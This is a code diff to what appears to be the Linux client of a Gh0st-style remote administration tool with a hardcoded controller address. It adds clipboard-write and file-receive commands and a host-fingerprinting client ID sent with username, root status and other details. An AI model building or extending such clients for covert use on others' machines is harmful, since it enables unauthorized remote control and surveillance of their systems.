@@ -27,7 +27,11 @@
 #include "ScreenHandler.h"
 #include "SystemManager.h"
 #include "FileManager.h"
+#include "ClipboardHandler.h"
+#include "FileTransferV2.h"
 #include "common/logger.h"
+#define XXH_INLINE_ALL
+#include "common/xxhash.h"
 #include "LinuxConfig.h"
 
 int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength);
@@ -37,6 +41,9 @@ CONNECT_ADDRESS g_SETTINGS = { FLAG_GHOST, "192.168.0.55", "6543", CLIENT_TYPE_L
 
 // 全局状态
 State g_bExit = S_CLIENT_NORMAL;
+
+// 客户端 ID（V2 文件传输需要）
+uint64_t g_myClientID = 0;
 
 // ============== UTF-8 → GBK 编码转换（服务端为 Windows GBK 环境） ==============
 
@@ -637,6 +644,34 @@ int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength)
         }
     } else if (szBuffer[0] == COMMAND_NEXT) {
         Mprintf("** [%p] Received 'NEXT' command ***\n", user);
+    } else if (szBuffer[0] == COMMAND_C2C_TEXT) {
+        // C2C 文本剪贴板: [cmd:1][dstClientID:8][textLen:4][text:N]
+        if (ulLength >= 13) {
+            uint32_t textLen;
+            memcpy(&textLen, szBuffer + 9, 4);
+            if (ulLength >= 13 + textLen && textLen > 0) {
+                if (!ClipboardHandler::IsAvailable()) {
+                    Mprintf("** [%p] C2C Text: clipboard unavailable (install xclip/xsel) ***\n", user);
+                } else {
+                    std::string utf8Text((const char*)szBuffer + 13, textLen);
+                    if (ClipboardHandler::SetText(utf8Text)) {
+                        Mprintf("** [%p] C2C Text received: %u bytes ***\n", user, textLen);
+                    } else {
+                        Mprintf("** [%p] C2C Text clipboard set failed ***\n", user);
+                    }
+                }
+            }
+        }
+    } else if (szBuffer[0] == COMMAND_C2C_PREPARE) {
+        // C2C 准备接收通知
+        FileTransferV2::HandleC2CPrepare(szBuffer, ulLength, nullptr);
+        Mprintf("** [%p] C2C Prepare received ***\n", user);
+    } else if (szBuffer[0] == COMMAND_SEND_FILE_V2 || szBuffer[0] == COMMAND_FILE_COMPLETE_V2) {
+        // V2 文件接收
+        int result = FileTransferV2::RecvFileChunkV2(szBuffer, ulLength, g_myClientID);
+        if (result != 0) {
+            Mprintf("** [%p] V2 File recv error: %d ***\n", user, result);
+        }
     } else {
         Mprintf("** [%p] Received unimplemented command: %d ***\n", user, int(szBuffer[0]));
     }
@@ -1111,7 +1146,19 @@ int main(int argc, char* argv[])
     logInfo.AddReserved(getUsername().c_str());                        // [13] RES_USERNAME
     logInfo.AddReserved(getuid() == 0 ? 1 : 0);                      // [14] RES_ISADMIN
     logInfo.AddReserved(getScreenResolution().c_str());               // [15] RES_RESOLUTION
-    logInfo.AddReserved("");                                          // [16] RES_CLIENT_ID（服务端自动计算）
+    // 计算客户端 ID（与服务端 CONTEXT_OBJECT::CalculateID 相同算法）
+    // 格式: pubIP|hostname|os|cpu|path
+    char cpuStr[32];
+    snprintf(cpuStr, sizeof(cpuStr), "%uMHz", logInfo.dwCPUMHz);
+    std::string idInput = (pubIP.empty() ? "?" : pubIP) + "|" +
+                          hostname + "|" +
+                          distro + "|" +
+                          cpuStr + "|" +
+                          exePath;
+    g_myClientID = XXH64(idInput.c_str(), idInput.length(), 0);
+    Mprintf("Calculated clientID: %llu (from: %s)\n", g_myClientID, idInput.c_str());
+
+    logInfo.AddReserved(std::to_string(g_myClientID).c_str());        // [16] RES_CLIENT_ID
     logInfo.AddReserved((int)getpid());                               // [17] RES_PID
     logInfo.AddReserved(getFileSize(exePath).c_str());                // [18] RES_FILESIZE
 
